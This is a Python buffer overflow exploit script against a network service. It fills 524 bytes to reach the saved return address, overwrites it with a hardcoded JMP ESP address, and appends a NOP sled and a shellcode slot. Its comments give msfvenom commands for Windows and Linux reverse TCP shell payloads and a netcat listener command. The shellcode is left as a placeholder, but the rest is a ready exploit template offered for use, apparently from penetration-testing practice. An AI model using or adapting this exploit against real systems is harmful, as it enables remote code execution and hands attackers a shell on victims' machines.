#!/usr/bin/python
# Python Script (6-exploit.py)

import socket
import sys

# !mona jmp -r esp -cpb  "\x00"
# esp return address 311712f3

# Win x86
# msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=443 -b '\x00' EXITFUNC=thread -f python -v shellcode
# linux target x86
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=eth0 LPORT=443 -b '\x00' EXITFUNC=thread -f python -v shellcode

# run
# nc lnvp 443

ip = sys.argv[1]
port = int(sys.argv[2])
offset = 524
payload = b"A" * offset
shellcode = b""
shellcode += b"<PAYLOAD HERE>"
retrn = b"\xf3\x12\x17\x31"
padding = b"\x90" * 16
payload += retrn
payload += padding
payload += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.recv(1024)
s.send(payload)
print(s.recv(1024))
